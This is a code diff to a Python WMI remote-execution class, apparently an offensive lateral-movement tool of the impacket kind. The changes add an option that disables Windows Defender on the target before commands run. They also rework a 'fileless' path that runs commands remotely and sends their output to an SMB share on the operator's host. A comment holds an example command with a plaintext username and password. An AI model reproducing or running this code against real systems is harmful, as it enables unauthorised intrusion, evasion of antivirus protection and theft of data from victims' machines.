@@ -44,7 +44,7 @@ DUMMY_SHARE     = 'TMP'
 CODEC = sys.stdout.encoding
 
 class WMIEXEC:
-    def __init__(self, target, share_name, username, password, domain, smbconnection, hashes=None, share=None):
+    def __init__(self, target, share_name, username, password, domain, smbconnection, hashes=None, share=None, killDefender=False):
         self.__target = target
         self.__username = username
         self.__password = password
@@ -61,6 +61,7 @@ class WMIEXEC:
         self.__aesKey = None
         self.__doKerberos = False
         self.__retOutput = True
+        self.__killDefender = killDefender
 
         #This checks to see if we didn't provide the LM Hash
         if hashes is not None:
@@ -94,12 +95,14 @@ class WMIEXEC:
 
             self.__win32Process,_ = iWbemServices.GetObject('Win32_Process')
         except  (Exception, KeyboardInterrupt) as e:
-                   if logging.getLogger().level == logging.DEBUG:
-                       import traceback
-                       traceback.print_exc()
-                   logging.error(str(e))
-                   if smbConnection is not None:
-                       smbConnection.logoff()
+            if logging.getLogger().level == logging.DEBUG:
+                import traceback
+                traceback.print_exc()
+                logging.error(str(e))
+            if smbconnection is not None:
+                smbconnection.logoff()
+            self.__dcom.disconnect()
+            sys.stdout.flush()
 
 
     def execute(self, command, output=False):
@@ -107,8 +110,15 @@ class WMIEXEC:
         if self.__retOutput:
             self.__smbconnection.setTimeout(100000)
 
+        #self.disable_notifications()
+        if self.__killDefender: self.disable_defender()
+
         self.execute_handler(command)
-        self.__dcom.disconnect()
+
+        if self.__smbconnection is not None:
+            self.__smbconnection.logoff()
+        #self.__dcom.disconnect()   # does this leave a sess up?
+
         return self.__outputBuffer
 
     def cd(self, s):
@@ -127,16 +137,12 @@ class WMIEXEC:
 
     def execute_handler(self, data):
         if self.__retOutput:
-            #self.disable_notifications()
-            self.disable_defender()
             try:
                 self.execute_fileless(data)
             except:
                 self.cd('\\')
                 self.execute_remote(data)
         else:
-            #self.disable_notifications()
-            self.disable_defender()
             self.execute_remote(data)
 
 
@@ -157,12 +163,12 @@ class WMIEXEC:
         local_ip = self.__smbconnection.getSMBServer().get_socket().getsockname()[0]
 
 
-        commandData = self.__shell + data + ' 1> \\\\{}\\{}\\{} 2>&1'.format(local_ip, 
+        command = self.__shell + data + ' 1> \\\\{}\\{}\\{} 2>&1'.format(local_ip, 
                                                                          self.__share_name,
                                                                          self.__output)
         #commandData = data + ' 1> \\\\{}\\{}\\{} 2>&1'.format(local_ip, 
-        #                                                                 self.__share_name,
-        #                                                                 self.__output)
+        #                                                      self.__share_name,
+        #                                                      self.__output)
         
         #adding creds gets past systems disallowing guest-auth
         # cmd.exe /Q /c "net use \\10.10.33.200\CAJKY /savecred /p:no /user:agrande User!23 & cmd.exe /Q /c whoami 1> \\10.10.33.200\CAJKY\QYkvxb 2>&1
@@ -173,10 +179,10 @@ class WMIEXEC:
         #                                                                                         self.__password, 
         #                                                                                         commandData)
 
-        command = self.__shell + '"net use * /d /y & '
-        command += 'net use \\\\{}\\{} & {} "'.format(local_ip, 
-                                                    self.__share_name,  
-                                                    commandData)
+        #command = self.__shell + 'net use * /d /y'
+        #command += self.__shell + 'net use \\\\{}\\{} & {} "'.format(local_ip, 
+        #                                            self.__share_name,  
+        #                                            commandData)
 
         logging.debug('wmi Executing_fileless command: {}'.format(command))
 
